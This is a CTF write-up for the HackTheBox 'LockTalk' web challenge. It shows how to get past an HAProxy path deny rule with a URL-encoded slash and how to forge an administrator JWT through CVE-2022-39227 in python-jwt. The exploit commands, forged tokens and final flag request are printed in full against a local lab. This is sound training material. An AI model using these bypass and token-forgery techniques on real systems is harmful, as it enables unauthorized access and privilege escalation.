---
name: LockTalk (2024)
event: HackTheBox Cyber Apocalypse CTF 2024
category: Web
description: Writeup for LockTalk (Web) - HackTheBox Cyber Apocalypse CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# LockTalk

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-vhl8ixthO4/0.jpg)](https://www.youtube.com/watch?v=-vhl8ixthO4?t=892 "HackTheBox Cyber Apocalypse '24: Lock Talk (web)")

## Description

> In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

## Solution

We can review source code but first let's check the site functionality. The homepage has 3 available API endpoints:

{% code overflow="wrap" %}
```txt
GET /api/v1/get_ticket - Generates a ticket (JWT token)
GET /api/v1/chat/{chatId} - Finds chat history by ID
GET /api/v1/flag - Retrieves the flag
```
{% endcode %}

Unfortunately, we can't execute the last two queries since they require a JWT. However, we can try to generate a JWT with `get_ticket`.

{% code overflow="wrap" %}
```txt
Forbidden: Request forbidden by administrative rules.
```
{% endcode %}

OK, I guess not then 🙃 I don't see any other interesting functionality and burp scanner didn't find anything notable. Time to review the source code!

The following line in `haproxy.cfg` explains the previous error. It's checking if our URL-decoded (`url_dec`), case-insensitive (`-i`) path begins (`path_beg`) with `/api/v1/get_ticket`.

{% code overflow="wrap" %}
```bash
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```
{% endcode %}

First, I thought maybe some [URL-format bypass tricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) might be required to bypass the path check. Then I saw some [reports](https://portswigger.net/daily-swig/http-request-smuggling-bug-patched-in-haproxy) about [HTTP request smuggling in haproxy](https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b),

I quickly realised this was a dead end since none of the endpoints support POST requests and the `deny` rule doesn't appear to exclude internal traffic.

I decided to try [403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122) and found a few different techniques to bypass, e.g. this one with a URL-encoded `/`.

{% code overflow="wrap" %}
```bash
http://127.0.0.1:1337/%2fapi/v1/get_ticket
```
{% endcode %}

Now we have a valid JWT and can read chat history but not retrieve the flag.

Checking `jwt_tool`, we find information about the token.

{% code overflow="wrap" %}
```bash
jwt_tool eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwODA5MTcsImlhdCI6MTcxMDA3NzMxNywianRpIjoiUkdjaHZFZVBNZFJYRlpQR2hHT0pOUSIsIm5iZiI6MTcxMDA3NzMxNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.Vzxw0lMT-Gbr6TaxLw5_rge7mYRpBvl2D1D1h8pUymROJML9BeYnbp0j1G2qUgWk2SMJTB43dt5nNb7z3mjK_Oe7RwLHTHhCxxyAjO3z4U2XhpmRhXm6YYALZELFY00Kv0yJvqlshFdnOgK0VnU3ziiUJvJRpRL4WHpMVspAHPyf6YHcgDiWyJua5-3nGog1bYcQy9CuxYKTfeXhVRBzsyyOoJII0EggDJIzfadf1OXh2MzGrkaXCghe8Whb9VGsrBRDGsELc2p0UOBAljJuKaPS2RtheX2-Kb8RAQ_ZtD_XQm0RD2HhFOyRRhSyRXmvsj2m3vT34z5Ix8nG4SZb8Q

Token header values:
[+] alg = "PS256"
[+] typ = "JWT"

Token payload values:
[+] exp = 1710080917    ==> TIMESTAMP = 2024-03-10 14:28:37 (UTC)
[+] iat = 1710077317    ==> TIMESTAMP = 2024-03-10 13:28:37 (UTC)
[+] jti = "RGchvEePMdRXFZPGhGOJNQ"
[+] nbf = 1710077317    ==> TIMESTAMP = 2024-03-10 13:28:37 (UTC)
[+] role = "guest"
[+] user = "guest_user"

Seen timestamps:
[*] exp was seen
[*] iat is earlier than exp by: 0 days, 1 hours, 0 mins
[*] nbf is earlier than exp by: 0 days, 1 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```
{% endcode %}

We're unable to crack secret due to an error: `Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.`

If we simply change role to `administrator` and sign with the `none` algorithm: `algorithm not allowed: none`.

Similarly, trying to sign with a null key using the [JWT editor burp extension](https://github.com/PortSwigger/jwt-editor) returns `algorithm not allowed: HS256`, but there's no `PS256` option for us to experiment with.

We can try and generate a key.

{% code overflow="wrap" %}
```bash
openssl genpkey -algorithm RSA -out private.pem
openssl rsa -pubout -in private.pem -out public.pem
```
{% endcode %}

Then try to tamper (inject claim) and sign it with `PSS RSA` using the `jwt_tool` (great [wiki](https://github.com/ticarpi/jwt_tool/wiki)).

{% code overflow="wrap" %}
```bash
jwt_tool eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwODMzNDksImlhdCI6MTcxMDA3OTc0OSwianRpIjoiR0pSLTJuS0JyV0VrMDNkdXNiOVRlZyIsIm5iZiI6MTcxMDA3OTc0OSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.IpTbfdY4bYGT0hLw9phgJlZVPAmBvze7KwY86jytKyqrSnIBZpUX_XG_oC8UUfUA8DCDZvsZteO1_QKLNqn2UHyDoVAdz0GUEMu8mTnM_CCxJ6jpfuI66cGWjyHJoQKYGhjLaC3ETJYMv38bCBKVUw2j5JgE_sJB-iMgcE-4EgDOfV_988bcGmWUbRoSEzFOTDLbhf15SkKEPnVIdCz00YKHJLJzMoFbGJimRcQTSXGlanfPOGao1V7r_d5VgntGELcuNuJpsq00rXLShsoRc1DXPvhtf_OVxvpQGo893UNUGAjHIPjhZZDA-sH_iyOC68Lf4NOBgUInxlkiN65tUg -I -pc role -pv administrator -S ps256 -pr private.pem
```
{% endcode %}

It does not work: `Verification failed for all signatures[\"Failed: [InvalidJWSSignature('Verification failed')]\"]`

OK, enough black box testing. We can check the source code and understand why this would fail; they generate their own key in `config.py`. Of course ours is not valid 😁

{% code overflow="wrap" %}
```python
JWT_SECRET_KEY = jwk.JWK.generate(kty='RSA', size=2048)
```
{% endcode %}

We can see how they generate the JWTs in `routes.py`.

{% code overflow="wrap" %}
```python
token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
```
{% endcode %}

Finally, we confirm that the `/flag` route is only accessible using the `administrator` role.

{% code overflow="wrap" %}
```python
@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```
{% endcode %}

I decided to look for any recent vulnerabilities in the [python-jwt](https://pypi.org/project/python-jwt/) package.

> **Note:** Versions 3.3.4 and later fix a [vulnerability](https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp) (CVE-2022-39227) in JSON Web Token verification which lets an attacker with a valid token re-use its signature with modified claims. CVE to follow. Please upgrade!

You don't say? That's exactly what we'd like to do! 😼

Let's check the [CVE-2022-39227 advisory](https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp)

> An attacker who obtains a JWT can **arbitrarily forge its contents without knowing the secret key**. Depending on the application, this may for example enable the attacker to spoof other user's identities, hijack their sessions, or bypass authentication.

It doesn't explain _how_ to forge a JWT but there are some accompanying [unit tests](https://github.com/davedoesdev/python-jwt/blob/master/test/vulnerability_vows.py)

{% code overflow="wrap" %}
```python
""" Test claim forgery vulnerability fix """
from datetime import timedelta
from json import loads, dumps
from test.common import generated_keys
from test import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode

@Vows.batch
class ForgedClaims(Vows.Context):
    """ Check we get an error when payload is forged using mix of compact and JSON formats """
    def topic(self):
        """ Generate token """
        payload = {'sub': 'alice'}
        return jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))

    class PolyglotToken(Vows.Context):
        """ Make a forged token """
        def topic(self, topic):
            """ Use mix of JSON and compact format to insert forged claims including long expiration """
            [header, payload, signature] = topic.split('.')
            parsed_payload = loads(base64url_decode(payload))
            parsed_payload['sub'] = 'bob'
            parsed_payload['exp'] = 2000000000
            fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
            return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

        class Verify(Vows.Context):
            """ Check the forged token fails to verify """
            @Vows.capture_error
            def topic(self, topic):
                """ Verify the forged token """
                return jwt.verify_jwt(topic, generated_keys['PS256'], ['PS256'])

            def token_should_not_verify(self, r):
                """ Check the token doesn't verify due to mixed format being detected """
                expect(r).to_be_an_error()
                expect(str(r)).to_equal('invalid JWT format')
```
{% endcode %}

I started to build a custom script but had lots of python package issues and ended up finding a pre-existing [PoC](https://github.com/user0x1337/CVE-2022-39227) instead 😌

{% code overflow="wrap" %}
```bash
python exploit.py -j "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.kwkl8iEwG9TQW3ZAHvAssvlQbjNbwtUPlA06IPV0P6aIQLrhlMWnx5wOp-i4HcZzGCaqq72ib6PconjjHMc1nZonAkebESLL-41P78xgGqiftwyZIzZc9QN2KktcbeapFpkCeDb8CAVMDDEx7eEuuOHgozWgVUzuYUk5pWRJrOfqyAPSHmvN9gm14_DPqRbOFviNq5o8Uw9UFLE8djJM0uDR7LHvKLIiFqikGJ52aHrLNRQqAw927uyPQ_EvH0ldpHi9Y6jkyWuImTK8f43JhxyBJPUOQXnwNaGP9ukf9zWlvYK4ZLp27b41HZFAWBNRMxDdpHUn4ARM__v8h8B9gw" -i "role=administrator"
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710085391, 'iat': 1710081791, 'jti': 'beH5fPnzYFYY5CAEWO-ZuA', 'nbf': 1710081791, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710085391, 'iat': 1710081791, 'jti': 'beH5fPnzYFYY5CAEWO-ZuA', 'nbf': 1710081791, 'role': 'administrator', 'user': 'guest_user'}
[+] Fake payload encoded: eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"kwkl8iEwG9TQW3ZAHvAssvlQbjNbwtUPlA06IPV0P6aIQLrhlMWnx5wOp-i4HcZzGCaqq72ib6PconjjHMc1nZonAkebESLL-41P78xgGqiftwyZIzZc9QN2KktcbeapFpkCeDb8CAVMDDEx7eEuuOHgozWgVUzuYUk5pWRJrOfqyAPSHmvN9gm14_DPqRbOFviNq5o8Uw9UFLE8djJM0uDR7LHvKLIiFqikGJ52aHrLNRQqAw927uyPQ_EvH0ldpHi9Y6jkyWuImTK8f43JhxyBJPUOQXnwNaGP9ukf9zWlvYK4ZLp27b41HZFAWBNRMxDdpHUn4ARM__v8h8B9gw"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"kwkl8iEwG9TQW3ZAHvAssvlQbjNbwtUPlA06IPV0P6aIQLrhlMWnx5wOp-i4HcZzGCaqq72ib6PconjjHMc1nZonAkebESLL-41P78xgGqiftwyZIzZc9QN2KktcbeapFpkCeDb8CAVMDDEx7eEuuOHgozWgVUzuYUk5pWRJrOfqyAPSHmvN9gm14_DPqRbOFviNq5o8Uw9UFLE8djJM0uDR7LHvKLIiFqikGJ52aHrLNRQqAw927uyPQ_EvH0ldpHi9Y6jkyWuImTK8f43JhxyBJPUOQXnwNaGP9ukf9zWlvYK4ZLp27b41HZFAWBNRMxDdpHUn4ARM__v8h8B9gw"}
```
{% endcode %}

Now, we just send the tampered token to the `/flag` endpoint in burp repeater and receive the flag.

{% code overflow="wrap" %}
```bash
GET /api/v1/flag HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://127.0.0.1:1337/
Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwODUzOTEsImlhdCI6MTcxMDA4MTc5MSwianRpIjoiYmVINWZQbnpZRllZNUNBRVdPLVp1QSIsIm5iZiI6MTcxMDA4MTc5MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"kwkl8iEwG9TQW3ZAHvAssvlQbjNbwtUPlA06IPV0P6aIQLrhlMWnx5wOp-i4HcZzGCaqq72ib6PconjjHMc1nZonAkebESLL-41P78xgGqiftwyZIzZc9QN2KktcbeapFpkCeDb8CAVMDDEx7eEuuOHgozWgVUzuYUk5pWRJrOfqyAPSHmvN9gm14_DPqRbOFviNq5o8Uw9UFLE8djJM0uDR7LHvKLIiFqikGJ52aHrLNRQqAw927uyPQ_EvH0ldpHi9Y6jkyWuImTK8f43JhxyBJPUOQXnwNaGP9ukf9zWlvYK4ZLp27b41HZFAWBNRMxDdpHUn4ARM__v8h8B9gw"}
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Sec-GPC: 1

```
{% endcode %}

Flag: `HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`
